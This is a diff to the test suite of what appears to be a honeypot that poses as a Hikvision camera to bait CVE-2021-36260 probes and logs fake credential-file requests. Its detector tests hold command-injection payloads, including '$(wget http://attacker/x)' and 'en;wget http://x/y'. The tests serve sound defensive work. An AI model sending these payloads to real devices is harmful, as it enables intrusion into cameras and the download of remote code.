@@ -353,6 +353,8 @@ def test_all_trap_families_default_on():
     assert tbenv.SONICWALL_ENABLED
     assert tbenv.CISCO_WEBVPN_ENABLED
     assert tbenv.IVANTI_VPN_ENABLED
+    assert tbenv.ASPERA_FASPEX_ENABLED
+    assert tbenv.HIKVISION_ENABLED
     assert tbenv.GEOSERVER_ENABLED
     assert tbenv.COLDFUSION_ENABLED
     assert tbenv.CMD_INJECTION_ENABLED
@@ -416,6 +418,9 @@ FAKE_TRACEBIT = {
     ("/backup.sql", b"AWS_ACCESS_KEY_ID=AKIAFAKEEXAMPLE01"),
     ("/config.json", b'"access_key_id": "AKIAFAKEEXAMPLE01"'),
     ("/firebase.json", b'"private_key_id": "AKIAFAKEEXAMPLE01"'),
+    ("/firebase-adminsdk.json", b'"private_key_id": "AKIAFAKEEXAMPLE01"'),
+    ("/gcp-service-account.json", b'"private_key_id": "AKIAFAKEEXAMPLE01"'),
+    ("/.config/gcloud/application_default_credentials.json", b'"private_key_id": "AKIAFAKEEXAMPLE01"'),
     ("/.docker/config.json", b'"auths"'),
     ("/docker-compose.yml", b"AWS_ACCESS_KEY_ID: AKIAFAKEEXAMPLE01"),
     ("/docker-compose.prod.yml", b"AWS_ACCESS_KEY_ID: AKIAFAKEEXAMPLE01"),
@@ -1640,6 +1645,117 @@ async def test_dispatch_aspera_faspex_disabled_returns_404(flux_client, monkeypa
     resp = await flux_client.get(
         "/aspera/faspex/",
         headers={"X-Forwarded-For": "203.0.113.83"},
+    )
+    assert resp.status == 404
+    entries = _log_entries(flux_client.log_path)
+    assert entries[-1]["result"] == "not-handled"
+
+
+# --- Hikvision IP-camera ISAPI trap (CVE-2021-36260 bait) ---
+
+
+def test_hikvision_enabled_by_default():
+    assert tbenv.HIKVISION_ENABLED
+
+
+def test_hikvision_default_paths_match_observed_probes():
+    for path in (
+        "/SDK/webLanguage",
+        "/sdk/weblanguage",
+        "/ISAPI/Security/userCheck",
+        "/ISAPI/System/deviceInfo",
+    ):
+        assert tbenv.is_hikvision_path(path), f"expected match: {path}"
+
+
+def test_hikvision_path_non_match():
+    for path in (
+        "/",
+        "/sdk",
+        "/SDK/",
+        "/isapi/",
+        "/ISAPI/Streaming/channels",  # not in our default set
+        "/.env",
+    ):
+        assert not tbenv.is_hikvision_path(path), f"unexpected match: {path}"
+
+
+def test_hikvision_disabled_returns_false(monkeypatch):
+    monkeypatch.setattr(tbenv, "HIKVISION_ENABLED", False)
+    assert not tbenv.is_hikvision_path("/SDK/webLanguage")
+
+
+def test_hikvision_has_cmdi_indicators():
+    # CVE-2021-36260 ships the command in the language XML element.
+    assert tbenv._hikvision_has_cmdi("", "<language>$(id)</language>")
+    assert tbenv._hikvision_has_cmdi("", "<language>`whoami`</language>")
+    assert tbenv._hikvision_has_cmdi("", "<language>en;wget http://x/y</language>")
+    assert tbenv._hikvision_has_cmdi("", "<language>en && curl http://x</language>")
+    # Plain GET banner-grab is not flagged.
+    assert not tbenv._hikvision_has_cmdi("", "")
+    assert not tbenv._hikvision_has_cmdi("", "en")
+
+
+async def test_dispatch_hikvision_sdk_weblanguage(flux_client):
+    resp = await flux_client.get(
+        "/SDK/webLanguage",
+        headers={"X-Forwarded-For": "203.0.113.91"},
+    )
+    assert resp.status == 200
+    text = await resp.text()
+    assert "<Language" in text
+    assert resp.headers.get("Server") == "App-webs/"
+    assert resp.headers.get("Content-Type", "").startswith("application/xml")
+
+    entry = _log_entries(flux_client.log_path)[-1]
+    assert entry["result"] == "hikvision-sdk-weblanguage"
+    assert entry["hikvisionPath"] == "/SDK/webLanguage"
+    assert entry["hikvisionMethod"] == "GET"
+    assert entry["hikvisionHasCmdInjection"] is False
+
+
+async def test_dispatch_hikvision_isapi_deviceinfo_advertises_firmware(flux_client):
+    resp = await flux_client.get(
+        "/ISAPI/System/deviceInfo",
+        headers={"X-Forwarded-For": "203.0.113.92"},
+    )
+    assert resp.status == 200
+    text = await resp.text()
+    assert "<DeviceInfo" in text
+    assert tbenv.HIKVISION_FIRMWARE_VERSION in text
+
+    entry = _log_entries(flux_client.log_path)[-1]
+    assert entry["result"] == "hikvision-isapi-deviceinfo"
+
+
+async def test_dispatch_hikvision_flags_cmd_injection_in_body(flux_client):
+    # CVE-2021-36260 PUT body shape — language parameter command injection.
+    body = (
+        b'<?xml version="1.0" encoding="UTF-8"?>\n'
+        b'<Language><language>$(wget http://attacker/x)</language></Language>'
+    )
+    resp = await flux_client.post(
+        "/SDK/webLanguage",
+        data=body,
+        headers={
+            "X-Forwarded-For": "203.0.113.93",
+            "Content-Type": "application/xml",
+        },
+    )
+    assert resp.status == 200
+
+    entry = _log_entries(flux_client.log_path)[-1]
+    assert entry["result"] == "hikvision-sdk-weblanguage"
+    assert entry["hikvisionMethod"] == "POST"
+    assert entry["hikvisionHasCmdInjection"] is True
+    assert "bodyPreview" in entry
+
+
+async def test_dispatch_hikvision_disabled_returns_404(flux_client, monkeypatch):
+    monkeypatch.setattr(tbenv, "HIKVISION_ENABLED", False)
+    resp = await flux_client.get(
+        "/SDK/webLanguage",
+        headers={"X-Forwarded-For": "203.0.113.94"},
     )
     assert resp.status == 404
     entries = _log_entries(flux_client.log_path)
